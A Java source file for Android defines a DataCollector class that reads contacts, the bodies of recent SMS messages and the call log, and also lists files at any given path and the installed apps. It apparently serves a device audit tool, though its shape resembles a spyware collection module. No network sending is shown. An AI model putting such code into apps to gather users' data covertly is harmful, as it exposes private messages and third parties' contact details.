package com.audit.device;

import android.Manifest;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;

import androidx.core.content.ContextCompat;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class DataCollector {

    public static List<Map<String, String>> getContacts(Context ctx) {
        List<Map<String, String>> out = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) return out;
        Cursor c = ctx.getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext() && out.size() < 200) {
                Map<String, String> m = new HashMap<>();
                m.put("name", c.getString(c.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                m.put("phone", c.getString(c.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER)));
                out.add(m);
            }
            c.close();
        }
        return out;
    }

    public static List<Map<String, String>> getSms(Context ctx) {
        List<Map<String, String>> out = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) return out;
        Cursor c = ctx.getContentResolver().query(
            Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
        if (c != null) {
            while (c.moveToNext() && out.size() < 100) {
                Map<String, String> m = new HashMap<>();
                m.put("from", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                m.put("body", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                m.put("date", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                out.add(m);
            }
            c.close();
        }
        return out;
    }

    public static List<Map<String, String>> getCallLog(Context ctx) {
        List<Map<String, String>> out = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) return out;
        Cursor c = ctx.getContentResolver().query(
            android.provider.CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
        if (c != null) {
            while (c.moveToNext() && out.size() < 100) {
                Map<String, String> m = new HashMap<>();
                m.put("number", c.getString(c.getColumnIndexOrThrow(
                    android.provider.CallLog.Calls.NUMBER)));
                m.put("type", c.getString(c.getColumnIndexOrThrow(
                    android.provider.CallLog.Calls.TYPE)));
                m.put("dur", c.getString(c.getColumnIndexOrThrow(
                    android.provider.CallLog.Calls.DURATION)));
                m.put("date", c.getString(c.getColumnIndexOrThrow(
                    android.provider.CallLog.Calls.DATE)));
                out.add(m);
            }
            c.close();
        }
        return out;
    }

    public static List<Map<String, String>> listFiles(String path) {
        List<Map<String, String>> out = new ArrayList<>();
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                Map<String, String> err = new HashMap<>();
                err.put("error", "not dir");
                out.add(err);
                return out;
            }
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    Map<String, String> m = new HashMap<>();
                    m.put("name", f.getName());
                    m.put("size", String.valueOf(f.length()));
                    m.put("dir", f.isDirectory() ? "1" : "0");
                    out.add(m);
                    if (out.size() >= 500) break;
                }
            }
        } catch (Exception e) {
            Map<String, String> err = new HashMap<>();
            err.put("error", e.getMessage());
            out.add(err);
        }
        return out;
    }

    public static List<Map<String, String>> listApps(Context ctx) {
        List<Map<String, String>> out = new ArrayList<>();
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        for (ApplicationInfo a : apps) {
            if (out.size() >= 300) break;
            Map<String, String> m = new HashMap<>();
            m.put("pkg", a.packageName);
            m.put("name", pm.getApplicationLabel(a).toString());
            m.put("system", (a.flags & ApplicationInfo.FLAG_SYSTEM) != 0 ? "1" : "0");
            out.add(m);
        }
        return out;
    }
}
